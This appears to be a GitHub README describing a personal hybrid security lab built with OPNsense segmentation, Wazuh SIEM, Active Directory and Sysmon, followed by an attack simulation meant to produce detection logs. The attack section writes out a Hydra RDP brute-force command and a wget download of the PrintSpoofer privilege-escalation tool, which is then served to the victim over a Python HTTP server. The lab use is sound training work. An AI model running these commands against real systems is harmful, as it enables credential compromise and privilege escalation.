# Hybrid-Security-Platform
Automated hybrid security platform integrating AWS, Wazuh SIEM, Suricata IDS/IPS, OPNsense segmentation, Terraform infrastructure deployment, and scripted user provisioning for centralized monitoring, threat detection, and security operations workflows.

This project simulates enterprise-style security monitoring by centralizing endpoint, network, and cloud telemetry into a unified detection and investigation environment.
## Architecture Overview
<img width="937" height="622" alt="image" src="https://github.com/user-attachments/assets/b387314f-b4b6-454a-abff-f08fbf3b68b1" />

## Key Features

- Hybrid AWS and on-prem security monitoring
- Centralized SIEM logging with Wazuh
- Suricata IDS/IPS network monitoring
- OPNsense firewall segmentation
- Attack simulation and detection validation
- Terraform-based infrastructure deployment
- Automated user provisioning scripts
- Threat investigation workflows

## Opnsense-Firewall-Network-Segmentation
We will set up a virtual environment using a Wide Area Network(WAN) and Local Area Network(LAN) and simulate a network connection between them. After downloading Virtual Box and Kali Linux we will configure a Wide Area Network(WAN) and Local Area Network(LAN) and simulate a network connection between them. Network Adapter one is used to simulate the WAN connection. Then adapater two is used to simulate a LAN connection.

<img width="688" height="366" alt="image" src="https://github.com/user-attachments/assets/9f1c844a-669a-4091-b3db-938e700fbd69" />

<img width="692" height="367" alt="image" src="https://github.com/user-attachments/assets/55bf9045-a1ba-469a-8792-03237989b362" />

Using the downloaded Opnsense file we will start the virtual machine with this disk file.

<img width="808" height="496" alt="image" src="https://github.com/user-attachments/assets/608b05f5-50ca-4e86-8a87-60fb82e04ad8" />

Using the defalut username installer and password opnsense. We are able to open the opnsense download menu.

<img width="732" height="496" alt="image" src="https://github.com/user-attachments/assets/885e27cb-3431-43e4-8a7b-787832a5d77f" />

After successfully downloading the firewall we remove the firewall disk and reboot the system. We will now login as a root user and assign the interfaces em0 will serve as the WAN interface and em1 will serve as the LAN interface. I will not configure the IP address as defalut one is given.

<img width="721" height="492" alt="image" src="https://github.com/user-attachments/assets/80853861-b6d9-40fa-bfbb-a9234fa5c772" />

Before booting up Kali Linux naviagte to the network adapters. Set the first adaper to NAT network(which allows for internet connection) and set the second adapeter to the LAN we have configured. This will allow the Kali Linux virtual machine to have internet connection, while also having access to the firewall we have configured. Next we will boot up kali linux and ping the Firewall virtual machine to check that the connection was configured correctly.

<img width="918" height="731" alt="image" src="https://github.com/user-attachments/assets/fe44590f-da46-4242-8d80-a7ad670b0414" />

Then I will open the web browser and look up the defalut IP that was given and login to opnsense and check the status of the system. Then I go to firmware and check the status of the system and give updates to the system.

<img width="1272" height="921" alt="image" src="https://github.com/user-attachments/assets/d7f00c16-d0c1-4da2-94d7-625338ce195a" />


To add network segmentation the first thing that must be done is add new internal networks adapters to the firewall. This is done by navigating to the settings and enabling all four network adapters. The first adapter should be set as a NAT network. What this does is allow for Network Address Translation between the WAN and the private LAN. This translates each virtual machines private IP address to the host machines public IP address for packets recieving and sending packets. Now to create each subnet name adapters 2-4 the following names intnet-client, intnet-server, and intnet-DMZ. Each network will host different machines. As seen in the diagram the client side will hold a windows 10 virtual machine. The server side will hold the Wazuh server and the active directory server. Then the demilitarized zone will hold the kali linux virtual machine. 

Then we will navigate to the kali linux machine and assign the different interfaces. This is done by logging into the opnsense firewall login page and navigating to interfaces and assignments. Then select each of the network adapters(em1, em2, em3) and name them client, server, and DMZ respectively. 

<img width="998" height="355" alt="image" src="https://github.com/user-attachments/assets/cc23f8f2-bd66-4a3a-a611-d5e9a0599a5d" />

Select save and interfaces and the names of each of the subnetworks should be displayed as follows.

<img width="198" height="377" alt="image" src="https://github.com/user-attachments/assets/2bfe8738-6ec0-4e0f-9c0d-9573b223efee" />

Select each individual subnetwork and select enable interface, set all of the ipv4 address to 10.200.10.1/24, 10.200.20.1/24, and 10.200.30.1/24 respectively. Save these settings navigate to the firewall, assign the interfaces as was done in the previous steps. When all networks have been accounted for, the result should look like this.

<img width="718" height="317" alt="image" src="https://github.com/user-attachments/assets/58e6fb6d-6a25-4e86-b9cb-daa6fb5d4e9f" />

We will add rules to all of the networks to simulate real network segmentation. select Firewall -> Rules -> Client, click add(+). 

<img width="1230" height="927" alt="image" src="https://github.com/user-attachments/assets/7f590ba1-793d-4815-88f4-20c0653ab29b" />

For the Client net the rules go as follows: Set Action: Pass, Interface: Client, Protocol: Any, Source: Client net, and Destination: any. Set Action: Pass, Interface: Client, Protocol: Any, Source: Client net, and Destination: Server net. For the DMZ net the rules go as folows: Action: Block, Interface: DMZ, Protocol: IPv4, Source: DMZ net, and Destination: Client net. Action: Block, Interface: DMZ, Protocol: IPv4, Source: DMZ net, and Destination: Server net. Action: Pass, Interface: DMZ, Protocol: IPv4, Source: DMZ net, and Destination: Any. Finally, the Server rules go as follows: Action: Pass, Interface: Server, Protocol: IPv4, Source: Server net, and Destination: Any. 

Now I will add the Windows 10 virtual machine and the Windows Active Directory Server. Create a new virtual machine with the Windows 10 iso image. I gave my machine 4096 MB and 1 CPU ad secleted skip unintended install. 

<img width="940" height="725" alt="image" src="https://github.com/user-attachments/assets/7138ce8e-26a2-476d-ad97-e912b06985a3" />

Power up the virtual machine and start the configuration process until prompted to activate Windows. Select I dont have a product key -> Windows 10 Pro. Click custom install to install Windows 10 only. Allow that installation to finish.

Now I will install the active directory server to do this download the Winodows 2022 server from the Windows website. Create a new machine and instert the iso image that was downloaded from the Windows website. Click skip unintended installation, next select finish to boot up the virtual machine.

<img width="945" height="717" alt="image" src="https://github.com/user-attachments/assets/7cc49d30-288b-4f70-ba32-4c3cbe1e7fa0" />

When the machine has started go through the configuration that is wanted then when prompted to ask for a version. Select the standard Evaluation Windows Server and select custom install. Wait for the installation to finish.

<img width="1022" height="847" alt="image" src="https://github.com/user-attachments/assets/716fe61d-0cae-4b7c-93de-86c877cbc339" />

When finished it will prompt the user to enter in a password then select finish. 

<img width="1022" height="856" alt="image" src="https://github.com/user-attachments/assets/26dbd1e4-4c6b-44ef-9859-d0fc61c457bc" />

Now we will configure the Wazuh server to allow the collection of logs. Go to the Ubuntu Server page and download this version.

<img width="381" height="218" alt="image" src="https://github.com/user-attachments/assets/4a8293a1-b67e-467a-abbb-2b4c2503ed3b" />

Create a new machine and use the now downloaded Ubuntu Server. Run through the configuration and complete the download. Once that is done the server should look like this.

<img width="801" height="101" alt="image" src="https://github.com/user-attachments/assets/e8af808a-196d-4001-b0f2-a7dd6695b260" />

Now we will install Wazuh. To do this login to the Ubuntu Server and enter these commands curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh and sudo bash wazuh-install.sh -a. 

<img width="800" height="325" alt="image" src="https://github.com/user-attachments/assets/f7ca0213-35f1-4a95-a2ac-d93a0ff93f61" />

Wait for the installation process to finish. Then login to the active directory server navigate to powershell to enter these commands. Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.7.5-1.msi -OutFile wazuh-agent.msi next msiexec /i wazuh-agent.msi WAZUH_MANAGER="10.200.20.10". To start the agent after installation use this command net start WazuhSvc. Login to Wazuh and check whether or not it is correctly configured.

<img width="1017" height="842" alt="image" src="https://github.com/user-attachments/assets/fd056e3a-f318-4db9-aa8b-a7fe152ff89c" />

We are going to finish setting up the active directory. Therefore, search server manager and select manage. Keep everything as is and select active directory domain services and select add feature. 

<img width="788" height="562" alt="image" src="https://github.com/user-attachments/assets/8c235459-636c-4644-9920-cf40b0c27e21" />

Once the installation has finished. Select promote this server to domain controller. 

<img width="337" height="272" alt="image" src="https://github.com/user-attachments/assets/fd64f7a1-0383-4b33-b67e-2b3ae188f899" />

Click add a new forest as well as name it lab.local. Select next for all options leading to the installation screen. Click install. When the instllation has finished the screen will display two users. Login to the main user that had a \ in the name. Once server manager opens select tools -> active directory users and computers. 

<img width="752" height="527" alt="image" src="https://github.com/user-attachments/assets/0c5ffa08-928e-4434-aded-ed9d6daeb29f" />

We are going to create a new organizational unit called SOC. This is done by right clicking the domain selecting new -> organizational unit. We will go to the newly created unit and select new -> user. Add a name as well as a new password to the user, select create.

<img width="755" height="271" alt="image" src="https://github.com/user-attachments/assets/85f575f3-d1d6-4067-9481-534ad337383c" />

Open the Windows 10 machine then type this PC and click properties. Scroll down to select advanced system settings.

<img width="802" height="630" alt="image" src="https://github.com/user-attachments/assets/d0577ebc-7910-43ef-af1b-7d9e9833fb67" />

Select domain and enter the name(lab.local). It will not work, to make it work go to ethernet -> properties -> IPv4 -> propeties. Enter the IP address of the domain controller into the DNS section. Once this is done repeat the previous step. You will get credentials that need to be entered. Enter administrator and the password that you created. 

<img width="510" height="463" alt="image" src="https://github.com/user-attachments/assets/22e82ff9-551a-4f1f-9962-c3ecd41f8efd" />

Install the Wazuh agent onto the Windows 10 machine as previously stated. After this is done open the Kali Linux VM and ping the IP address of the Windows 10 machine.

<img width="647" height="106" alt="image" src="https://github.com/user-attachments/assets/521f7533-528c-4b6d-b3d5-65f8ee618a1a" />

It will fail because of a rule that we previously configured to not allow the DMZ and Client networks to communicate with one another. To fix this navigate to the search bar and search the IP address of the firewall. Once this is done select Firewall -> Rules -> DMZ. Replace the old rule and allow traffic from the DMZ to the Client network. 

Security Design Decisions
- Added network segmentation creating Client, Server, and DMZ networks to reduce latteral movement of attackers.
- Prevented DMZ communication with the Client and Server networks. This is done to simulate an untrusted external zone.
- Allowed Client and Server communication for authentication and services.
- Designed to reduce latteral movement of attackers if the system is infiltrated.

## Attack-Simulation
First we will be installing Sysmon onto my Windows 10 virtual machine. We will be doing this because it provides deeper endpoint visibility. To download Sysmon search Sysmon and download it from the offical Microsoft website. 

<img width="357" height="273" alt="image" src="https://github.com/user-attachments/assets/ec5c63e5-3520-45d6-b4a9-fc996a2d7d32" />

Download it and we will download the olaf configuration. Navigate to github and search olaf sysmon configuration. Scroll down to the sysmonconfig.xml file. Download it as a raw file then save it. Next extract the contents of the compressed sysmon file. Then copy the path of the folder and open powershell with administrator privlages. 

<img width="1121" height="201" alt="image" src="https://github.com/user-attachments/assets/57e317f8-6e8e-4ddb-b452-6b15466a0a28" />

Enter the command seen in the photo below to finish the configuration of Sysmon on the Windows 10 virtual machine.

<img width="856" height="377" alt="image" src="https://github.com/user-attachments/assets/d7d5941e-38cf-46f5-8a1e-141d6a5524cf" />

Now we want to forward Sysmon logs to Wazuh. This is done by navigating to notepad and opening it as an administrator. Open a file in notepad then access the file by going to file system -> This PC -> Local Disk -> Program files x86 -> ossec-agent -> ossec.conf. Add the line of code shown below and save the changes.

<img width="495" height="71" alt="image" src="https://github.com/user-attachments/assets/32bab886-89ee-4fb0-bb1e-8cf9c527004e" />

Next open Powershell as an Administrator and run this command Restart-Service -Name Wazuh. Check that sysmon is collecting logs

<img width="697" height="296" alt="image" src="https://github.com/user-attachments/assets/4c0fa5e3-3ac6-4f88-99f0-4b0e37f49285" />

Now we want to inspect whether or not logs are being forwarded to Wazuh. Login to the Wazuh dashboard. Then select the agent and remove all filters as well as any intial fields. Then add these fields and search Sysmon in the search bar. Select refresh to look at the new logs

<img width="340" height="135" alt="image" src="https://github.com/user-attachments/assets/64bac079-a6e5-443a-b63f-645219c2da4c" />

<img width="1548" height="752" alt="image" src="https://github.com/user-attachments/assets/b335e170-dada-4b99-afc9-ca0ea233a73a" />

These configuartions will act like an EDR for our endpoint systems. I made this decision because IDS have become less reliable beacuse of encrypted traffic, but are still useful. Therefore, I will not only use EDR for endpoint defense, but also conifgure suricata rules for network defense.

Now I will simulate a brute force attack using Windows Remote Desktop Protocol and collecting logs of the attack. First I will collect the login credientals of a user and then peform a privlage escilation. 

To do this first opent the kali linux virtual machine. Open the terminal to enter the command sudo apt-get update && sudo apt-get upgrade -y. After it has finished downloading create a directory with the command mkdir <Directory_Name>. We will download crowbar onto the Kali Linux machine to do this enter the command sudo apt-get install -y crowbar. Cd into the /usr/share/wordlists/ directory to find the Rockyou.txt file and unzip it with gunzip.

<img width="562" height="325" alt="image" src="https://github.com/user-attachments/assets/90ad5e99-a9c2-420b-8b53-6673aca3b340" />

Then copy the rockyou.txt file to the ad-project directory. Enter the directory and use the command head -n 20 rockyou.txt > passwords.txt. Then nano the passwords.txt to add the password of the jsmith user. Next save the file and navigate to the Winodws 10 virtual machine. Search This PC -> properties -> advanced system settings -> remote -> allow remote connections to this computer -> select users. After this is done enter the command hydra -l jsmith -P passwords.txt rdp://10.200.10.10. 

<img width="630" height="346" alt="image" src="https://github.com/user-attachments/assets/e3cc7501-3cdd-4fc3-9760-602afe55a4ef" />

After the login credentials have been compromised run the command wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe -O printspoofer.exe on the Kali Linux machine to create a script for privlage escalation. After it has been downloaded on the kali linux machine start a http server with Python using the command python3 -m http.server 8000. On the Windows 10 VM enter http://10.200.30.10:8000 and download the printSpoofer.exe file. 

This confirms success and that the user system has now been comprimised. Now I will like to look at the logs generated as a result of this. Login to the Wazuh dashboard and enter the credintals. Select Modiules -> security Events and enter the number 4625(this number correlates to failed login attempts). 

<img width="1047" height="535" alt="image" src="https://github.com/user-attachments/assets/918492ba-a63c-42ea-8af2-c8db87b0f1e4" />

Open the log to see more detailed information about how the attempt.

<img width="692" height="761" alt="image" src="https://github.com/user-attachments/assets/452896e0-2d4c-4d76-9825-835f14028d49" />


<img width="820" height="698" alt="image" src="https://github.com/user-attachments/assets/4b3b2513-ff99-4177-95b1-220bc340cf32" />

<img width="1652" height="742" alt="image" src="https://github.com/user-attachments/assets/e900c466-c329-4558-b71a-7d94a9359106" />

From the information given we can see the IP address of the Kali Linux machine and the fail login attempts.
